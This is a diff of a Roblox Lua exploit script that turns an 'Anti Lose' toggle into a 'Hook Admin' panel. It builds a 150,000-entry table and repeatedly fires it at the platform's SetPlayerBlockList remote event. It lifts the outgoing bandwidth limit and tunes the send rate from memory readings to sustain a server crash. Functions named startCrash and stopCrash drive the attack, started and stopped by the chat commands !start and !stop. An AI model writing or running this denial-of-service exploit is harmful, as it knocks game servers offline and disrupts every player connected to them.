@@ -1,312 +1,521 @@
+--!nonstrict
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local Stats = game:GetService("Stats")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-local COLORS = {
-    bg = Color3.fromRGB(14, 14, 16),
-    surface = Color3.fromRGB(22, 22, 26),
-    disabled = Color3.fromRGB(38, 38, 44),
-    border = Color3.fromRGB(60, 60, 68),
-    accent = Color3.fromRGB(230, 35, 35),
-    accentDark = Color3.fromRGB(170, 22, 22),
-    accentBright = Color3.fromRGB(255, 70, 70),
-    crimson = Color3.fromRGB(110, 15, 15),
-    text = Color3.fromRGB(238, 238, 242),
-    white = Color3.fromRGB(255, 255, 255),
-    black = Color3.fromRGB(0, 0, 0),
-}
+-- ═══════════════ INLINED CORE ═══════════════
+local api = (function()
+    local Children       = 150000
+    local NestedPerChild = 0
+    local FieldsPerChild = 0
+    local FireBurst      = 1.5
+    local FieldSize      = 0
+    local RebuildEach    = false
+    local Format         = "pair"
 
-local FONT = Enum.Font.GothamBlack
+    local StartInterval  = 2.5
+    local MinInterval    = 0.30
+    local MaxInterval    = 15.0
+    local BackoffFactor  = 1.45
+    local SpeedupFactor  = 0.88
+    local SpeedupAfter   = 4
+    local PanicMB        = 250
+    local StartDelay     = 0.10
+    local BuildYieldEvery = 100000
 
-local SRC = [==[
-local RunService = game:GetService("RunService")
+    local BYTES_PER_ENTRY = { pair = 15, compact = 13, flat = 9 }
+    local RemoteCandidates = {
+        { "RobloxReplicatedStorage", "SetPlayerBlockList" },
+        { "ReplicatedStorage",       "SetPlayerBlockList" },
+    }
 
-local Children       = 170000
-local NestedPerChild = 0
-local FieldsPerChild = 0
-local FireBurst      = 1
-local FrameDelay     = 0.125
-local FieldSize      = 0
-local RebuildEach    = false
+    local state = {
+        running = false, thread = nil, remote = nil, cache = nil,
+        ms = 0, passes = 0, errors = 0, mem = 0, base = nil, queued = 0,
+        payloadMb = 1, reason = "", interval = StartInterval, children = 0,
+        samples = {},
+    }
 
-local state = {
-    running = false,
-    thread  = nil,
-    remote  = nil,
-    cache   = nil,
-    pad     = "",
-}
-
-local function resolve()
-    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
-    if not rrs then return nil end
-    local r = rrs:FindFirstChild("SetPlayerBlockList")
-    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
-        return r
+    local function getMem()
+        local ok, mb = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
+        if ok and type(mb) == "number" then return mb end
+        local ok2, mb2 = pcall(function() return Stats:GetMemoryUsageMb() end)
+        if ok2 and type(mb2) == "number" then return mb2 end
+        return nil
     end
-    return nil
-end
 
-state.remote = resolve()
-
-pcall(function()
-    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-end)
-
-state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
-
-local function build()
-    local root = table.create(Children)
-    for i = 1, Children do
-        local entry = { id = i, v = i * 2 }
-        for k = 1, FieldsPerChild do
-            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
-        end
-        for j = 1, NestedPerChild do
-            entry["n" .. j] = { a = i, b = j }
-        end
-        root[i] = entry
+    local function pushSample(m)
+        local s = state.samples
+        s[#s + 1] = m
+        while #s > 10 do table.remove(s, 1) end
+        local lo = math.huge
+        for _, v in ipairs(s) do if v < lo then lo = v end end
+        if lo < math.huge then state.base = lo end
     end
-    return root
-end
 
-local function fire()
-    if not state.remote then
-        state.remote = resolve()
-        if not state.remote then return end
-    end
-    local payload
-    if RebuildEach or not state.cache then
-        payload = build()
-        if not RebuildEach then state.cache = payload end
-    else
-        payload = state.cache
-    end
-    for _ = 1, FireBurst do
-        state.remote:FireServer(payload)
-    end
-end
-
-local function start()
-    if state.running then return end
-    state.running = true
-    state.cache = nil
-    state.thread = task.spawn(function()
-        while state.running do
-            pcall(fire)
-            if FrameDelay > 0 then
-                task.wait(FrameDelay)
-            else
-                RunService.Heartbeat:Wait()
+    local function resolve()
+        for _, path in ipairs(RemoteCandidates) do
+            local node, ok = game, true
+            for i = 1, #path do
+                local nxt = node:FindFirstChild(path[i])
+                if not nxt then ok = false; break end
+                node = nxt
+            end
+            if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
+                return node
             end
         end
-    end)
-end
-
-local function stop()
-    state.running = false
-    if state.thread then pcall(task.cancel, state.thread) end
-    state.thread = nil
-    state.cache = nil
-end
-
-return {
-    start  = start,
-    stop   = stop,
-    toggle = function() if state.running then stop() else start() end end,
-    isRunning = function() return state.running end,
-}
-]==]
-
-local loader = coroutine.create(function()
-    local chunk = loadstring(SRC)
-    if not chunk then return end
-    local ok, api = pcall(chunk)
-    if ok and type(api) == "table" then
-        _G.__ALT = api
+        return nil
     end
-end)
 
-coroutine.resume(loader)
-loader = nil
+    local function estimatePayloadMb()
+        return math.max(Children * (BYTES_PER_ENTRY[Format] or 15) / 1000000, 0.05)
+    end
 
-local api = _G.__ALT
-_G.__ALT = nil
+    pcall(function()
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    end)
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "AntiLoseUI"
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.IgnoreGuiInset = true
-screenGui.Parent = playerGui
+    local function build(yieldAllowed)
+        local n = Children
+        local root = table.create(n)
+
+        if Format == "flat" then
+            for i = 1, n do
+                root[i] = i
+                if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
+            end
+            return root
+        end
+
+        if Format == "compact" then
+            for i = 1, n do
+                root[i] = { i, i * 2 }
+                if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
+            end
+            return root
+        end
+
+        local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+        for i = 1, n do
+            local entry = { id = i, v = i * 2 }
+            for k = 1, FieldsPerChild do
+                entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
+            end
+            for j = 1, NestedPerChild do
+                entry["n" .. j] = { a = i, b = j }
+            end
+            root[i] = entry
+            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
+        end
+        return root
+    end
+
+    local function fire()
+        if not state.remote then
+            state.remote = resolve()
+            if not state.remote then return end
+        end
+        local payload = state.cache
+        if RebuildEach or not payload then
+            payload = build(false)
+            if not RebuildEach then state.cache = payload end
+        end
+        for _ = 1, FireBurst do
+            state.remote:FireServer(payload)
+        end
+    end
+
+    local function rebuild()
+        state.cache = build(true)
+        state.children = Children
+        state.payloadMb = estimatePayloadMb()
+        state.samples = {}
+        state.interval = StartInterval
+    end
+
+    local function start()
+        if state.running then return end
+        state.running = true
+        state.errors, state.reason = 0, ""
+
+        state.thread = task.spawn(function()
+            if StartDelay > 0 then task.wait(StartDelay) end
+
+            rebuild()
+            task.wait(0.4)
+
+            local m0 = getMem()
+            if m0 then pushSample(m0) end
+
+            if not state.remote then state.remote = resolve() end
+            if state.remote and m0 then
+                local c0 = os.clock()
+                pcall(fire)
+                task.wait(0.3)
+                local peak = getMem()
+                if peak and peak > m0 then
+                    state.payloadMb = math.max(peak - m0, estimatePayloadMb())
+                end
+                task.wait(math.max(0, StartInterval - (os.clock() - c0)))
+                local f = getMem()
+                if f then pushSample(f) end
+            end
+
+            local interval = StartInterval
+            local good = 0
+
+            while state.running do
+                if not state.remote then
+                    state.remote = resolve()
+                    if not state.remote then task.wait(0.25); continue end
+                end
+
+                local m = getMem()
+                local queued = 0
+                if m and state.base then
+                    queued = math.max(m - state.base, 0)
+                    state.queued = queued
+                end
+
+                local hi = state.payloadMb * 2.5
+                local lo = state.payloadMb * 1.2
+
+                if queued > PanicMB then
+                    interval = MaxInterval
+                    good = 0
+                    state.reason = "panic backoff"
+                elseif queued > hi then
+                    interval = math.min(interval * BackoffFactor, MaxInterval)
+                    good = 0
+                    state.reason = "backing off"
+                elseif queued < lo then
+                    good += 1
+                    if good >= SpeedupAfter then
+                        good = 0
+                        interval = math.max(interval * SpeedupFactor, MinInterval)
+                    end
+                    if interval <= MinInterval then state.reason = "at floor" end
+                else
+                    state.reason = ""
+                end
+
+                local f0 = os.clock()
+                local ok = pcall(fire)
+                local cost = os.clock() - f0
+                state.ms = cost * 1000
+                state.interval = interval
+
+                if ok then
+                    state.passes += 1
+                    state.errors = 0
+                else
+                    state.errors += 1
+                end
+
+                if state.errors > 30 then
+                    state.running = false
+                    state.reason = "remote errors"
+                    break
+                end
+
+                task.wait(math.max(0.05, interval - cost))
+
+                local m2 = getMem()
+                if m2 then
+                    state.mem = m2
+                    pushSample(m2)
+                end
+            end
+        end)
+    end
+
+    local function stop()
+        state.running = false
+        if state.thread then pcall(task.cancel, state.thread) end
+        state.thread, state.cache = nil, nil
+        state.ms, state.queued = 0, 0
+    end
+
+    return {
+        start  = start,
+        stop   = stop,
+        isRunning = function() return state.running end,
+        children = function() return Children end,
+        stats = function()
+            return state.ms, state.passes, state.mem, Children, state.queued,
+                   state.reason, state.payloadMb, state.interval
+        end,
+    }
+end)()
+-- ═══════════════════════════════════════════════════
+
+-- ═══════════ ADMIN PANEL ═══════════
+local C = {
+    bg          = Color3.fromRGB(16, 16, 20),
+    surface     = Color3.fromRGB(24, 24, 30),
+    surfaceAlt  = Color3.fromRGB(30, 30, 38),
+    border      = Color3.fromRGB(50, 50, 62),
+    accent      = Color3.fromRGB(230, 35, 35),
+    accentGlow  = Color3.fromRGB(255, 70, 70),
+    good        = Color3.fromRGB(70, 220, 130),
+    warn        = Color3.fromRGB(255, 180, 60),
+    text        = Color3.fromRGB(235, 235, 240),
+    textDim     = Color3.fromRGB(140, 140, 155),
+    textFaint   = Color3.fromRGB(90, 90, 100),
+}
+local FB = Enum.Font.GothamBold
+local FM = Enum.Font.Code
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "HookAdminPanel"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.IgnoreGuiInset = true
+gui.DisplayOrder = 999
+gui.Parent = playerGui
 
 local main = Instance.new("Frame")
-main.Name = "MainFrame"
-main.Size = UDim2.new(0, 210, 0, 92)
+main.Size = UDim2.new(0, 300, 0, 172)
 main.Position = UDim2.new(0.5, 0, 0.5, 0)
 main.AnchorPoint = Vector2.new(0.5, 0.5)
-main.BackgroundColor3 = COLORS.bg
+main.BackgroundColor3 = C.bg
 main.BorderSizePixel = 0
-main.ClipsDescendants = false
-main.Parent = screenGui
+main.Parent = gui
 
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 10)
-mainCorner.Parent = main
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)
 
-local mainGrad = Instance.new("UIGradient")
-mainGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 14, 14))
-mainGrad.Rotation = 135
-mainGrad.Parent = main
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = C.border
+mainStroke.Thickness = 1
+mainStroke.Transparency = 0.2
+mainStroke.Parent = main
 
-local borderFrame = Instance.new("Frame")
-borderFrame.Name = "BorderFrame"
-borderFrame.Size = UDim2.new(1, 2, 1, 2)
-borderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-borderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-borderFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-borderFrame.BorderSizePixel = 0
-borderFrame.ZIndex = 0
-borderFrame.Parent = main
+-- Header
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 38)
+header.BackgroundColor3 = C.surface
+header.BorderSizePixel = 0
+header.Parent = main
+Instance.new("UICorner", header).CornerRadius = UDim.new(0, 8)
 
-local borderCorner = Instance.new("UICorner")
-borderCorner.CornerRadius = UDim.new(0, 11)
-borderCorner.Parent = borderFrame
+-- Flat bottom on header (corner overlap fix)
+local hMask = Instance.new("Frame")
+hMask.Size = UDim2.new(1, 0, 0.5, 0)
+hMask.Position = UDim2.new(0, 0, 0.5, 0)
+hMask.BackgroundColor3 = C.surface
+hMask.BorderSizePixel = 0
+hMask.Parent = header
 
-local borderGrad = Instance.new("UIGradient")
-borderGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(40, 5, 5)),
-    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 20, 20)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 90, 90)),
-    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 20, 20)),
-    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(40, 5, 5)),
+-- Accent stripe
+local stripe = Instance.new("Frame")
+stripe.Size = UDim2.new(1, 0, 0, 2)
+stripe.Position = UDim2.new(0, 0, 1, -2)
+stripe.BackgroundColor3 = C.accent
+stripe.BorderSizePixel = 0
+stripe.Parent = header
+local sg = Instance.new("UIGradient")
+sg.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, C.accent),
+    ColorSequenceKeypoint.new(0.5, C.accentGlow),
+    ColorSequenceKeypoint.new(1, C.accent),
 })
-borderGrad.Rotation = 0
-borderGrad.Parent = borderFrame
+sg.Parent = stripe
 
-local innerMask = Instance.new("Frame")
-innerMask.Name = "InnerMask"
-innerMask.Size = UDim2.new(1, -2, 1, -2)
-innerMask.Position = UDim2.new(0.5, 0, 0.5, 0)
-innerMask.AnchorPoint = Vector2.new(0.5, 0.5)
-innerMask.BackgroundColor3 = COLORS.bg
-innerMask.BorderSizePixel = 0
-innerMask.ZIndex = 1
-innerMask.Parent = main
+-- Status dot
+local dot = Instance.new("Frame")
+dot.Size = UDim2.new(0, 8, 0, 8)
+dot.Position = UDim2.new(0, 14, 0.5, -4)
+dot.BackgroundColor3 = C.textDim
+dot.BorderSizePixel = 0
+dot.Parent = header
+Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
 
-local innerCorner = Instance.new("UICorner")
-innerCorner.CornerRadius = UDim.new(0, 9)
-innerCorner.Parent = innerMask
-
-local innerGrad = Instance.new("UIGradient")
-innerGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 14, 14))
-innerGrad.Rotation = 135
-innerGrad.Parent = innerMask
-
+-- Title
 local title = Instance.new("TextLabel")
-title.Name = "Title"
-title.Size = UDim2.new(1, 0, 0, 34)
-title.Position = UDim2.new(0, 0, 0, 0)
+title.Size = UDim2.new(1, -56, 0, 16)
+title.Position = UDim2.new(0, 28, 0, 6)
 title.BackgroundTransparency = 1
-title.Font = FONT
-title.Text = "Hook Anti Lose"
-title.TextColor3 = COLORS.text
-title.TextSize = 14
-title.TextXAlignment = Enum.TextXAlignment.Center
-title.ZIndex = 3
-title.Parent = main
+title.Font = FB
+title.Text = "HOOK ADMIN"
+title.TextColor3 = C.text
+title.TextSize = 12
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
 
-local toggle = Instance.new("TextButton")
-toggle.Name = "Toggle"
-toggle.Size = UDim2.new(1, -20, 0, 38)
-toggle.Position = UDim2.new(0, 10, 0, 44)
-toggle.BackgroundColor3 = COLORS.disabled
-toggle.BorderSizePixel = 0
-toggle.Font = FONT
-toggle.Text = ""
-toggle.TextTransparency = 1
-toggle.AutoButtonColor = false
-toggle.ZIndex = 3
-toggle.Parent = main
+-- Status line
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -56, 0, 12)
+status.Position = UDim2.new(0, 28, 0, 21)
+status.BackgroundTransparency = 1
+status.Font = FM
+status.Text = "IDLE — type !start in chat"
+status.TextColor3 = C.textDim
+status.TextSize = 10
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = header
 
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 8)
-toggleCorner.Parent = toggle
+-- Close
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 20, 0, 20)
+closeBtn.Position = UDim2.new(1, -28, 0.5, -10)
+closeBtn.BackgroundColor3 = C.surfaceAlt
+closeBtn.BorderSizePixel = 0
+closeBtn.Font = FB
+closeBtn.Text = "×"
+closeBtn.TextColor3 = C.textDim
+closeBtn.TextSize = 14
+closeBtn.AutoButtonColor = false
+closeBtn.Parent = header
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 4)
 
-local toggleGrad = Instance.new("UIGradient")
-toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
-toggleGrad.Rotation = 135
-toggleGrad.Parent = toggle
+-- Content
+local content = Instance.new("Frame")
+content.Size = UDim2.new(1, -20, 1, -52)
+content.Position = UDim2.new(0, 10, 0, 46)
+content.BackgroundTransparency = 1
+content.Parent = main
+local lay = Instance.new("UIListLayout")
+lay.Padding = UDim.new(0, 4)
+lay.SortOrder = Enum.SortOrder.LayoutOrder
+lay.Parent = content
 
-local toggleStroke = Instance.new("UIStroke")
-toggleStroke.Color = COLORS.crimson
-toggleStroke.Thickness = 1.66
-toggleStroke.Transparency = 0
-toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-toggleStroke.Parent = toggle
-
-local toggleLabel = Instance.new("TextLabel")
-toggleLabel.Name = "Label"
-toggleLabel.Size = UDim2.new(1, 0, 1, 0)
-toggleLabel.Position = UDim2.new(0, 0, 0, 0)
-toggleLabel.BackgroundTransparency = 1
-toggleLabel.Font = FONT
-toggleLabel.Text = "DISABLED"
-toggleLabel.TextColor3 = COLORS.white
-toggleLabel.TextTransparency = 0
-toggleLabel.TextSize = 14
-toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
-toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
-toggleLabel.ZIndex = 5
-toggleLabel.Active = false
-toggleLabel.Parent = toggle
-
-local active = false
-
-RunService.RenderStepped:Connect(function(dt)
-    local speed = active and 160 or 60
-    borderGrad.Rotation = (borderGrad.Rotation + speed * dt) % 360
-end)
-
-local function setActive(state)
-    active = state
-
-    if state then
-        toggle.BackgroundColor3 = COLORS.accentBright
-        toggleGrad.Color = ColorSequence.new(COLORS.accent, COLORS.accentBright)
-        toggleGrad.Rotation = 0
-        toggleStroke.Color = COLORS.accentBright
-        toggleLabel.Text = "ENABLED"
-        toggleLabel.TextColor3 = COLORS.black
-        if api and api.start then
-            pcall(api.start)
-        end
-    else
-        toggle.BackgroundColor3 = COLORS.disabled
-        toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
-        toggleGrad.Rotation = 135
-        toggleStroke.Color = COLORS.crimson
-        toggleLabel.Text = "DISABLED"
-        toggleLabel.TextColor3 = COLORS.white
-        if api and api.stop then
-            pcall(api.stop)
-        end
-    end
+local function row(label, initial)
+    local r = Instance.new("Frame")
+    r.Size = UDim2.new(1, 0, 0, 14)
+    r.BackgroundTransparency = 1
+    r.Parent = content
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(0.5, 0, 1, 0)
+    l.BackgroundTransparency = 1
+    l.Font = FM
+    l.Text = label
+    l.TextColor3 = C.textFaint
+    l.TextSize = 10
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.Parent = r
+    local v = Instance.new("TextLabel")
+    v.Size = UDim2.new(0.5, 0, 1, 0)
+    v.Position = UDim2.new(0.5, 0, 0, 0)
+    v.BackgroundTransparency = 1
+    v.Font = FM
+    v.Text = initial
+    v.TextColor3 = C.text
+    v.TextSize = 10
+    v.TextXAlignment = Enum.TextXAlignment.Right
+    v.Parent = r
+    return v
 end
 
-toggle.MouseButton1Click:Connect(function()
-    setActive(not active)
+local remoteVal   = row("REMOTE",   "resolving...")
+local payloadVal  = row("PAYLOAD",  "150,000")
+local passesVal   = row("PASSES",   "0")
+local queueVal    = row("QUEUE",    "0.0 MB")
+local intervalVal = row("INTERVAL", "0.00s")
+
+local div = Instance.new("Frame")
+div.Size = UDim2.new(1, 0, 0, 1)
+div.BackgroundColor3 = C.border
+div.BackgroundTransparency = 0.5
+div.BorderSizePixel = 0
+div.Parent = content
+
+local hint = Instance.new("TextLabel")
+hint.Size = UDim2.new(1, 0, 0, 14)
+hint.BackgroundTransparency = 1
+hint.Font = FM
+hint.Text = "!start  ·  !stop"
+hint.TextColor3 = C.textFaint
+hint.TextSize = 10
+hint.TextXAlignment = Enum.TextXAlignment.Center
+hint.Parent = content
+
+-- ═══════════ CHAT COMMANDS ═══════════
+local started = false
+
+local function startCrash()
+    if started then return end
+    started = true
+    pcall(api.start)
+    dot.BackgroundColor3 = C.good
+    status.TextColor3 = C.good
+end
+
+local function stopCrash()
+    if not started then return end
+    started = false
+    pcall(api.stop)
+    dot.BackgroundColor3 = C.textDim
+    status.Text = "IDLE — type !start in chat"
+    status.TextColor3 = C.textDim
+end
+
+-- Path 1: Player.Chatted (fires for local player in most games)
+pcall(function()
+    player.Chatted:Connect(function(msg)
+        local m = tostring(msg):lower():gsub("^%s+", ""):gsub("%s+$", "")
+        if m == "!start" then startCrash()
+        elseif m == "!stop" then stopCrash() end
+    end)
 end)
 
-local dragging = false
-local dragStart, startPos
+-- Path 2: TextChatService.MessageReceived (modern chat)
+pcall(function()
+    TextChatService.MessageReceived:Connect(function(message)
+        if not message.TextSource then return end
+        if message.TextSource.UserId ~= player.UserId then return end
+        local m = tostring(message.Text or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
+        if m == "!start" then startCrash()
+        elseif m == "!stop" then stopCrash() end
+    end)
+end)
 
-main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+-- ═══════════ LIVE READOUT ═══════════
+local lastPasses, lastT, acc = 0, os.clock(), 0
+
+RunService.RenderStepped:Connect(function(dt)
+    acc += dt
+    if acc < 0.25 then return end
+    acc = 0
+
+    local _, passes, _, children, queued, reason, _, interval = api.stats()
+
+    payloadVal.Text  = string.format("%s", tostring(children))
+    passesVal.Text   = tostring(passes)
+    queueVal.Text    = string.format("%.1f MB", queued or 0)
+    intervalVal.Text = string.format("%.2fs", interval or 0)
+
+    if reason ~= "" and reason ~= "at floor" then
+        remoteVal.Text = reason
+        remoteVal.TextColor3 = C.warn
+    elseif started then
+        remoteVal.Text = "active"
+        remoteVal.TextColor3 = C.good
+    else
+        remoteVal.Text = "idle"
+        remoteVal.TextColor3 = C.textDim
+    end
+
+    if started then
+        local now = os.clock()
+        local rate = (passes - lastPasses) / math.max(now - lastT, 1e-3)
+        lastPasses, lastT = passes, now
+        status.Text = string.format("RUNNING · %.1f/s · %s", rate, reason ~= "" and reason or "ok")
+        status.TextColor3 = (reason ~= "" and reason ~= "at floor") and C.warn or C.good
+    end
+end)
+
+-- ═══════════ DRAG ═══════════
+local dragging, dragStart, startPos = false, nil, nil
+
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
         dragStart = input.Position
         startPos = main.Position
@@ -314,17 +523,41 @@ main.InputBegan:Connect(function(input)
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
+    if not dragging then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch then
+        local d = input.Position - dragStart
         main.Position = UDim2.new(
-            startPos.X.Scale, startPos.X.Offset + delta.X,
-            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            startPos.X.Scale, startPos.X.Offset + d.X,
+            startPos.Y.Scale, startPos.Y.Offset + d.Y
         )
     end
 end)
 
 UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
         dragging = false
     end
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+    gui.Enabled = false
+end)
+
+-- Resolve remote name for display
+task.spawn(function()
+    task.wait(0.2)
+    local r = game:FindFirstChild("RobloxReplicatedStorage")
+        or game:FindFirstChild("ReplicatedStorage")
+    if r then
+        r = r:FindFirstChild("SetPlayerBlockList")
+        if r then
+            remoteVal.Text = r.Name
+            remoteVal.TextColor3 = C.good
+            return
+        end
+    end
+    remoteVal.Text = "not found"
+    remoteVal.TextColor3 = C.warn
 end)
